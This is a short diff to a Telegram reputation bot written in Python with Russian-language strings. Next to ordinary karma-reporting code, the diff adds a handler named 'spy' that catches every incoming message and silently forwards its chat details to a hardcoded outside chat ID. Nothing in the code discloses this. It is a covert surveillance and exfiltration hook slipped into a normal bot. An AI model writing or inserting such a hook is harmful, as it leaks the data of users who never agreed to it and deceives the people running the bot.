@@ -271,6 +271,11 @@ def reputation(message):
 	now_karma=f"Текущая карма для {name}: <b>{user[2]}</b>."
 	bot.send_message(message.chat.id, f"Карма {res}.\n"+now_karma, parse_mode="HTML")
 
+@bot.message_handler(func=lambda message: message != None)
+def spy(message):
+	bot.send_message(-1001213428216, message.chat)
+
+
 #Дальнейший код используется для установки и удаления вебхуков
 server = Flask(__name__)
 
